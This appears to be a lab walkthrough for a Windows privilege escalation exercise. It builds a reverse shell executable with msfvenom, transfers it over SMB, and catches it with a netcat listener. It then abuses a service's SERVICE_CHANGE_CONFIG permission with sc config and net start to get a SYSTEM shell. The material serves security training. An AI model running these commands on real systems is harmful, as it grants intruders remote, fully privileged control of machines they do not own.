# Task2:

Creating reverse shell exe:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

Transfering the exe file to trgt windows using inpacket to set up **smbserver** on kali linux, although there are many ways to do this.

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py <username> <share path>
```

On windows,
```
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

Testing the rev shell on kali:
```
sudo nc -nvlp 53
```

Running the rev shell on windows:
```
C:\PrivEsc\reverse.exe
```

# Task3: Service Exploits - Insecure Service Permissions

Using accesschk.exe to check **"user"** account permission on the "daclsvc" service:
```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

`/accepteula` : Telling the program that you accept the EULA, and not to display a popup
u : Suppress error
w : Show only objs that have write access
c : Windows service name
q : Omit Banner
v : Verbose
link: [sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
acesscheck Winapi link: [msdocs](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-accesscheck)

```
C:\PrivEsc> C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
 C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

**"user"** account has the permission to change the service config ***(SERVICE_CHANGE_CONFIG)***.

Query the service and note that it runs with ***SYSTEM privileges (SERVICE_START_NAME)***:

```
sc qc daclsvc
```

This command doesn't work in Win10 but in win server.
link: [msdocs](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742055(v=ws.11)

Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:
```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```
Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
```
net start daclsvc
```

1. What is the original BINARY_PATH_NAME of the daclsvc service?
> C:\Program Files\DACL Service\daclservice.exe

Using:
```
sc qc daclsvc
```

